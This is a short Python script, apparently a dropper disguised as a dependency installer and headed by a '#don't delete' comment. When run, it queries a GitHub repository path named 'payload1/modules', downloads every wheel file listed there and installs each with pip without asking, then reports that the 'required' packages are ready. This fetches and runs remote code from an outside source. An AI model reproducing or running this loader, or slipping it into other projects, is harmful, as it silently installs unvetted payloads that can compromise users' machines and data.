#don't delete

import requests
import subprocess
import os
import tempfile
import importlib.util

def is_python_installed():
    try:
        subprocess.check_output(['python', '--version'])
        return True
    except subprocess.CalledProcessError:
        return False
    except FileNotFoundError:
        try:
            subprocess.check_output(['python3', '--version'])
            return True
        except subprocess.CalledProcessError:
            return False
        except FileNotFoundError:
            return False

def is_package_installed(package_name):
    package_spec = importlib.util.find_spec(package_name)
    return package_spec is not None

def get_package_name_from_whl(whl_filename):
    return whl_filename.split('-')[0]

def download_and_install_whls(repo_url):
    response = requests.get(repo_url)
    
    if response.status_code == 200:
        files = response.json()
        for file in files:
            if file['name'].endswith('.whl'):
                package_name = get_package_name_from_whl(file['name'])
                if not is_package_installed(package_name):
                    url = file['download_url']
                    download_and_install_whl(url, file['name'])
                else:
                    print(f"Package {package_name} is already installed.")
    else:
        print(f"Failed to retrieve the list of files. Status code: {response.status_code}")

def download_and_install_whl(url, filename):
    if not is_python_installed():
        print("Python is not installed. Aborting")
        return
    try:
        with tempfile.NamedTemporaryFile(delete=False, suffix='.whl') as tmp_file:
            response = requests.get(url)
            tmp_file.write(response.content)
            tmp_file.close()
            valid_wheel_filename = os.path.join(tempfile.gettempdir(), filename)
            if os.path.exists(valid_wheel_filename):
                os.remove(valid_wheel_filename)
            os.rename(tmp_file.name, valid_wheel_filename)
            subprocess.check_call(['pip', 'install', valid_wheel_filename])
            os.remove(valid_wheel_filename)
    except Exception as e:
        print(f"Error downloading or installing whl: {e}")

repo_url = 'https://api.github.com/repos/slayy2357/payload1/contents/modules'
download_and_install_whls(repo_url)

print("All required whl packages are installed and ready to use.")